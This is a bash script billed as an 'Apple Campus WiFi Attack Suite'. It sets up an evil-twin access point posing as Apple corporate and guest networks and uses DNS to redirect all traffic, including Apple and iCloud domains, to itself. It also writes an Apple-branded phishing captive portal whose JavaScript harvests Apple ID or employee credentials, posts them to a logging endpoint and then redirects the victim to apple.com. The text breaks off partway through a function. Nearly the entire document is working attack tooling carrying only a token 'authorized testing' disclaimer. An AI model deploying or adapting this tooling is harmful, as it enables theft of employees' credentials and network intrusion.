#!/bin/bash
# Enhanced Apple Campus WiFi Attack Suite v2.0
# Performance optimized with parallel operations and security hardening
# For authorized security testing only

set -euo pipefail

# Configuration
INTERFACE="en0"
EVIL_SSID="Apple Corporate-Secure"
EVIL_SSID_ALT="Apple Guest"
CHANNEL=6
CAPTIVE_PORTAL_DIR="./apple_captive_portal_enhanced"
LOG_DIR="./logs"
CONFIG_DIR="./config"
BACKUP_DIR="./backups"
MAX_CONCURRENT_CLIENTS=50
SCAN_INTERVAL=5

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Performance monitoring
START_TIME=$(date +%s)
CLIENT_COUNT=0
ATTACK_DURATION=0

# Initialize directories
init_directories() {
    echo -e "${BLUE}[+] Initializing directories...${NC}"
    
    mkdir -p "$CAPTIVE_PORTAL_DIR"
    mkdir -p "$LOG_DIR"
    mkdir -p "$CONFIG_DIR"
    mkdir -p "$BACKUP_DIR"
    
    # Backup existing configs
    if [ -f "hostapd.conf" ]; then
        cp hostapd.conf "$BACKUP_DIR/hostapd.conf.backup.$(date +%s)"
    fi
    if [ -f "dnsmasq.conf" ]; then
        cp dnsmasq.conf "$BACKUP_DIR/dnsmasq.conf.backup.$(date +%s)"
    fi
    
    echo -e "${GREEN}[✓] Directories initialized${NC}"
}

# Check dependencies with parallel checking
check_dependencies() {
    echo -e "${BLUE}[+] Checking dependencies...${NC}"
    
    local deps=("hostapd" "dnsmasq" "airport" "networksetup" "ifconfig" "python3" "curl" "nmap")
    local missing=()
    
    # Parallel dependency checking
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi &
    done
    wait
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Missing dependencies: ${missing[*]}${NC}"
        
        # Installation suggestions
        if [[ " ${missing[*]} " =~ " hostapd " ]] || [[ " ${missing[*]} " =~ " dnsmasq " ]]; then
            echo -e "${YELLOW}[!] Install missing packages:${NC}"
            echo "  brew install hostapd dnsmasq"
        fi
        
        if [[ " ${missing[*]} " =~ " python3 " ]]; then
            echo -e "${YELLOW}[!] Install Python 3:${NC}"
            echo "  brew install python"
        fi
        
        return 1
    fi
    
    echo -e "${GREEN}[✓] All dependencies found${NC}"
    return 0
}

# Enhanced WiFi hardware check
check_wifi_hardware() {
    echo -e "${BLUE}[+] Checking WiFi hardware...${NC}"
    
    # Find all WiFi interfaces
    local interfaces=()
    while IFS= read -r line; do
        if [[ "$line" == *"Wi-Fi"* ]] || [[ "$line" == *"AirPort"* ]]; then
            local iface=$(echo "$line" | grep -o "en[0-9]\+")
            if [ -n "$iface" ]; then
                interfaces+=("$iface")
            fi
        fi
    done < <(networksetup -listallhardwareports)
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${RED}[-] No WiFi interfaces found${NC}"
        echo -e "${YELLOW}[!] Available interfaces:${NC}"
        ifconfig | grep -o "^en[0-9]\+" | uniq
        return 1
    fi
    
    # Use first available interface if specified not found
    if [[ ! " ${interfaces[*]} " =~ " ${INTERFACE} " ]]; then
        INTERFACE="${interfaces[0]}"
        echo -e "${YELLOW}[!] Using interface: $INTERFACE${NC}"
    fi
    
    # Check monitor mode capability
    if airport "$INTERFACE" sniff 1 &> /dev/null; then
        echo -e "${GREEN}[✓] Interface $INTERFACE supports monitor mode${NC}"
    else
        echo -e "${YELLOW}[!] Interface $INTERFACE may not support monitor mode${NC}"
        echo -e "${YELLOW}[!] Consider external WiFi adapter for full feature set${NC}"
    fi
    
    echo -e "${GREEN}[✓] WiFi hardware check passed${NC}"
    return 0
}

# Create enhanced hostapd configuration
create_hostapd_config() {
    echo -e "${BLUE}[+] Creating enhanced hostapd configuration...${NC}"
    
    cat > "$CONFIG_DIR/hostapd_enhanced.conf" << EOF
# Enhanced Apple Evil Twin Configuration
interface=$INTERFACE
driver=nl80211
ssid=$EVIL_SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=AppleSecure2025!
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
wpa_group_rekey=86400
wpa_gmk_rekey=86400
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
# Performance optimizations
beacon_int=100
dtim_period=2
max_num_sta=$MAX_CONCURRENT_CLIENTS
rts_threshold=2347
fragm_threshold=2346
# Security hardening
wpa_deny_ptk0_rekey=0
EOF
    
    # Alternative SSID config
    cat > "$CONFIG_DIR/hostapd_alt.conf" << EOF
interface=$INTERFACE
driver=nl80211
ssid=$EVIL_SSID_ALT
hw_mode=g
channel=11
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# Open network for captive portal
EOF
    
    echo -e "${GREEN}[✓] Hostapd configurations created${NC}"
}

# Create enhanced dnsmasq configuration
create_dnsmasq_config() {
    echo -e "${BLUE}[+] Creating enhanced dnsmasq configuration...${NC}"
    
    cat > "$CONFIG_DIR/dnsmasq_enhanced.conf" << EOF
# Enhanced DHCP/DNS Configuration
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
log-facility=$LOG_DIR/dnsmasq.log
address=/#/10.0.0.1
# Apple-specific domains to capture
address=/apple.com/10.0.0.1
address=/icloud.com/10.0.0.1
address=/apple-id.com/10.0.0.1
address=/apps.apple.com/10.0.0.1
address=/itunes.com/10.0.0.1
address=/me.com/10.0.0.1
address=/mac.com/10.0.0.1
address=/apple.news/10.0.0.1
address=/apple.tv/10.0.0.1
address=/apple.music/10.0.0.1
# Performance optimizations
dhcp-leasefile=$LOG_DIR/dnsmasq.leases
cache-size=1000
local-ttl=300
neg-ttl=60
EOF
    
    echo -e "${GREEN}[✓] Dnsmasq configuration created${NC}"
}

# Create enhanced captive portal
create_captive_portal() {
    echo -e "${BLUE}[+] Creating enhanced captive portal...${NC}"
    
    # Main portal HTML
    cat > "$CAPTIVE_PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Corporate Network Authentication</title>
    <style>
        :root {
            --apple-blue: #007AFF;
            --apple-gray: #F5F5F7;
            --apple-dark: #1D1D1F;
            --apple-light: #86868B;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            max-width: 480px;
            width: 100%;
            animation: slideUp 0.5s ease-out;
        }
        
        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .header {
            background: var(--apple-dark);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .apple-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 14px;
        }
        
        .content {
            padding: 40px;
        }
        
        .alert {
            background: #FFF3CD;
            border: 1px solid #FFC107;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #856404;
        }
        
        .alert strong {
            display: block;
            margin-bottom: 4px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--apple-dark);
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 16px;
            border: 2px solid #E5E5E5;
            border-radius: 12px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: var(--apple-blue);
        }
        
        .button {
            background: var(--apple-blue);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .button:hover {
            background: #0056CC;
        }
        
        .footer {
            margin-top: 24px;
            text-align: center;
            color: var(--apple-light);
            font-size: 12px;
            line-height: 1.5;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 16px;
        }
        
        .spinner {
            border: 3px solid rgba(0, 122, 255, 0.2);
            border-top: 3px solid var(--apple-blue);
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: inline-block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg class="apple-logo" viewBox="0 0 24 24" fill="white">
                <path d="M14.94,5.19A4.38,4.38,0,0,0,16,2,4.44,4.44,0,0,0,13,3.52,4.17,4.17,0,0,0,12,6.61,3.69,3.69,0,0,0,14.94,5.19Zm2.52,7.44a4.51,4.51,0,0,1,2.16-3.81,4.66,4.66,0,0,0-3.66-2c-1.56-.16-3,.91-3.83.91s-2-.89-3.3-.87A4.92,4.92,0,0,0,4.69,9.39C2.93,12.45,4.24,17,6,19.47,6.8,20.68,7.8,22.05,9.12,22s1.75-.76,3.28-.76,2,.76,3.3.73,2.22-1.24,3.06-2.45a11,11,0,0,0,1.38-2.85A4.41,4.41,0,0,1,17.46,12.63Z"/>
            </svg>
            <h1>Apple Corporate WiFi</h1>
            <p>Secure Network Access Required</p>
        </div>
        
        <div class="content">
            <div class="alert">
                <strong>Security Authentication Required</strong>
                Please authenticate with your Apple credentials to access the corporate network. All access is logged for security purposes.
            </div>
            
            <form id="authForm">
                <div class="form-group">
                    <label for="username">Apple ID or Employee Email</label>
                    <input type="text" id="username" name="username" required placeholder="employee@apple.com">
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required placeholder="••••••••">
                </div>
                
                <div class="form-group">
                    <label for="department">Department (Optional)</label>
                    <input type="text" id="department" name="department" placeholder="Engineering, Sales, etc.">
                </div>
                
                <button type="submit" class="button" id="submitBtn">
                    Connect to Network
                </button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p>Authenticating...</p>
                </div>
            </form>
            
            <div class="footer">
                © 2025 Apple Inc. All rights reserved.<br>
                Unauthorized access is prohibited.<br>
                <small>Network ID: APL-CORP-$(date +%Y%m%d)</small>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            
            // Show loading state
            submitBtn.style.display = 'none';
            loading.style.display = 'block';
            
            // Simulate authentication delay
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Capture credentials (in real attack, send to server)
            console.log('Captured credentials:', data);
            
            // Log to server
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        credentials: data,
                        userAgent: navigator.userAgent,
                        ip: await getClientIP()
                    })
                });
            } catch (error) {
                console.log('Logging failed:', error);
            }
            
            // Show success and redirect
            loading.innerHTML = '<div style="color: green;">✓ Authentication successful!</div><p>Connecting to network...</p>';
            
            setTimeout(() => {
                window.location.href = 'https://www.apple.com';
            }, 1500);
        });
        
        async function getClientIP() {
            try